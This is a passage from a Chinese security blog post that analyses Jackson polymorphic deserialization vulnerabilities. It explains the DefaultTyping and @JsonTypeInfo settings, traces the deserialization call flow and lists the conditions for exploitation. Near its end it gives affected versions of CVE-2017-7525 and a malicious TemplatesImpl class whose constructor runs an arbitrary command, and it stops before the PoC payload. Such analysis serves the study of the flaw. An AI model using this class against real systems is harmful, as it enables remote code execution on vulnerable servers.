<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        nonePeople p = <span class="keyword">new</span> nonePeople();</span><br><span class="line">        p.age = <span class="number">10</span>;</span><br><span class="line">        p.name = <span class="string">"0range"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Teacher();</span><br><span class="line">        p.sex=<span class="keyword">new</span> MySex();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        nonePeople p2 = mapper.readValue(json, nonePeople<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nonePeople</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看看结果：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916105510656.png" alt="image-20200916105510656"></p>
<h3 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h3><p>支持上文全部类型的Array类型。</p>
<p>例如下面的代码，我们的Object里存放0range的对象数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        nonePeople p = <span class="keyword">new</span> nonePeople();</span><br><span class="line">        p.age = <span class="number">10</span>;</span><br><span class="line">        p.name = <span class="string">"0range"</span>;</span><br><span class="line">        p.sex=<span class="keyword">new</span> MySex();</span><br><span class="line">        Teacher[] teachers= <span class="keyword">new</span> Teacher[<span class="number">2</span>];</span><br><span class="line">        teachers[<span class="number">0</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        teachers[<span class="number">1</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        p.object = teachers;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">      	<span class="comment">//设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line">      </span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        nonePeople p2 = mapper.readValue(json, nonePeople<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nonePeople</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>结果：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916110448375.png" alt="image-20200916110448375"></p>
<h3 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h3><p>除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。</p>
<p>例如下面的代码，添加了类型为l1nk3r的变量，非Object也非虚，但也可以被序列化出来。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        nonePeople p = <span class="keyword">new</span> nonePeople();</span><br><span class="line">        p.age = <span class="number">10</span>;</span><br><span class="line">        p.name = <span class="string">"0range"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Teacher();</span><br><span class="line">        p.sex=<span class="keyword">new</span> MySex();</span><br><span class="line">        p.teacher=<span class="keyword">new</span> Teacher();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">      	<span class="comment">//设置NON_FINAL</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line">      </span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        nonePeople nonePeople = mapper.readValue(json, nonePeople<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(nonePeople);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nonePeople</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line">    <span class="keyword">public</span> Teacher teacher;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看结果：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916110938041.png" alt="image-20200916110938041"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：</p>
<table>
<thead>
<tr>
<th align="left">DefaultTyping类型</th>
<th align="left">描述说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">JAVA_LANG_OBJECT</td>
<td align="left">属性的类型为Object</td>
</tr>
<tr>
<td align="left">OBJECT_AND_NON_CONCRETE</td>
<td align="left">属性的类型为Object、Interface、AbstractClass</td>
</tr>
<tr>
<td align="left">NON_CONCRETE_AND_ARRAYS</td>
<td align="left">属性的类型为Object、Interface、AbstractClass、Array</td>
</tr>
<tr>
<td align="left">NON_FINAL</td>
<td align="left">所有除了声明为final之外的属性</td>
</tr>
</tbody></table>
<h2 id="JsonTypeInfo注解"><a href="#JsonTypeInfo注解" class="headerlink" title="@JsonTypeInfo注解"></a>@JsonTypeInfo注解</h2><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.COSTOM)</span><br></pre></td></tr></table></figure>

<p>讲到底，其实就是给类中属性加注解。</p>
<h3 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h3><p>demo如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JTTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectMapper mapper= <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name= <span class="string">"0range"</span>;</span><br><span class="line">        user.age=<span class="number">100</span>;</span><br><span class="line">        user.obj=<span class="keyword">new</span> Height();</span><br><span class="line">        String json = mapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line">    <span class="keyword">public</span> Object obj;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"name:"</span> + name + <span class="string">" age:"</span> + age + <span class="string">" obj:"</span> + obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Height</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> h = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916143527537.png" alt="image-20200916143527537"></p>
<p>和没有设置值为JsonTypeInfo.Id.NONE的@JsonTypeInfo注解是一样的。</p>
<p>这种方式的输出结果实际上是我们最想要的，这里只需要相关参数的值，并没有其他一些无用信息。</p>
<h3 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h3><p>修改User类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.CLASS。</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916143723383.png" alt="image-20200916143723383"></p>
<p>输出看到，object属性中多了”@class”:”com.fxc.Height”，即含有具体的类的信息，同时反序列化出来的object属性Height类对象，即能够成功对指定类型进行序列化和反序列化：</p>
<p>也就是说，在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过@class的方式指定相关类，并进行相关调用。</p>
<h3 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h3><p>修改User类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.MINIMAL_CLASS。</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916143921325.png" alt="image-20200916143921325"></p>
<p>输出看到，object属性中多了”@c”:”com.fxc.Height”，即使用@c替代料@class，官方描述中的意思是缩短了相关类名，实际效果和JsonTypeInfo.Id.CLASS类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用。</p>
<h3 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h3><p>修改User类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.NAME。</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916144431986.png" alt="image-20200916144431986"></p>
<p>输出看到，object属性中多了”@type”:”Height”，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的。</p>
<h3 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h3><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916145715384.png" alt="image-20200916145715384"></p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>所以按照上述分析，3种情况下可以触发Jackson反序列化漏洞</p>
<p>1、enableDefaultTyping()</p>
<p>2、@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</p>
<p>3、@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</p>
<h1 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h1><p>调试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaLangObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        String json=<span class="string">"&#123;\"age\":10,\"name\":\"0range\",\"sex\":[\"com.fxctest.MySex\",&#123;\"sex\":100&#125;]&#125;"</span>;</span><br><span class="line">        People p2 = mapper.readValue(json, People<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"age=%d, name=%s, sex=%d"</span>, age, name,sex.getSex());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里函数调用极其复杂，总体归纳出下面这张图：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916153735705.png" alt="image-20200916153735705"></p>
<p>整体流程：</p>
<ol>
<li><p>BeanDeserializer.deserialize()函数中，调用了vanillaDeserialize()函数；</p>
</li>
<li><p>跟进去，BeanDeserializer.vanillaDeserialize()函数的实现比较简单，先调用createUsingDefault()函数来调用指定类的无参构造函数来生成类实例；</p>
</li>
<li><p>BeanDeserializer.vanillaDeserialize()函数调用完无参的类的构造函数生成实例Bean后，就开始进入do while循环，来循环解析键值对中的属性值并调用deserializeAndSet()函数来解析并设置Bean的属性值；</p>
</li>
<li><p>跟进该SettableBeanProperty.deserialize()函数，可以看到有两个反序列化的代码逻辑，其中if判断语句会判断当前反序列化的内容是否携带类型，若是则调用deserializeWithType()函数解析，否则直接调用deserialize()函数解析：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916155244721.png" alt="image-20200916155244721"></p>
</li>
<li><p>跟进AbstractDeserializer.deserializeWithType()函数中，进一步调用了AsArrayTypeDeserializer.deserializeTypedFromObject()函数来解析：</p>
</li>
</ol>
<p>其中 <code>BeanDeserializerBase#vanillaDeserialize</code> 中有两个关键点：</p>
<p>1、<code>StdValueInstantiator#createUsingDefault</code> 方法负责调用 <code>AnnotatedConstructor#call</code>中call方法，然后通过反射方式来寻找我们从json中输入的类。</p>
<p>2、<code>MethodProperty#deserializeAndSet</code> 方法负责寻找相关setter设置，这里也是通过invoke反射的方式。</p>
<p>简单梳理一遍，Jackson反序列化的过程为：</p>
<ol>
<li>先调用通过无参的构造函数生成目标类实例</li>
<li>接着是根据属性值是否是数组的形式即是否带类名来分别调用不同的函数来设置实例的属性值，其中会调用Object类型属性的构造函数和setter方法。</li>
</ol>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在Jackson反序列化中，若调用了enableDefaultTyping()函数或使用@JsonTypeInfo注解指定反序列化得到的类的属性为JsonTypeInfo.Id.CLASS或JsonTypeInfo.Id.MINIMAL_CLASS，则会调用该属性的类的构造函数和setter方法。</p>
<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p>
<ul>
<li>调用了ObjectMapper.enableDefaultTyping()函数；</li>
<li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；</li>
<li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由之前的结论知道，当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类的构造函数和setter方法。</p>
<p>而如果该构造函数或setter方法存在危险操作，那么就存在Jackson反序列化漏洞。</p>
<h2 id="CVE-2017-7525（基于TemplatesImpl利用链）"><a href="#CVE-2017-7525（基于TemplatesImpl利用链）" class="headerlink" title="CVE-2017-7525（基于TemplatesImpl利用链）"></a>CVE-2017-7525（基于TemplatesImpl利用链）</h2><h3 id="环境限制"><a href="#环境限制" class="headerlink" title="环境限制"></a>环境限制</h3><p>Jackson 2.6系列 &lt; 2.6.7.1</p>
<p>Jackson 2.7系列 &lt; 2.7.9.1</p>
<p>Jackson 2.8系列 &lt; 2.8.8.1</p>
<p>JDK版本为1.7.0_21</p>
<p>本地用的jar包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，commons-codec-1.12，commons-io-2.5，spring-core-4.3.13.RELEASE。</p>
<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>直接上代码，首先是Exploit.java，恶意类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader br = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">//修改成你想要执行的命令</span></span><br><span class="line">            Process p = Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">            br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(line + <span class="string">"\n"</span>);</span><br><span class="line">                System.out.println(sb);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            File file = <span class="keyword">new</span> File(<span class="string">"result.txt"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//if file doesnt exists, then create it</span></span><br><span class="line">            <span class="keyword">if</span>(!file.exists())&#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//true = append file</span></span><br><span class="line">            FileWriter fileWritter = <span class="keyword">new</span> FileWriter(file.getName(),<span class="keyword">true</span>);</span><br><span class="line">            BufferedWriter bufferWritter = <span class="keyword">new</span> BufferedWriter(fileWritter);</span><br><span class="line">            bufferWritter.write(sb.toString());</span><br><span class="line">            bufferWritter.close();</span><br><span class="line">            System.out.println(sb);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是PoC：</p>
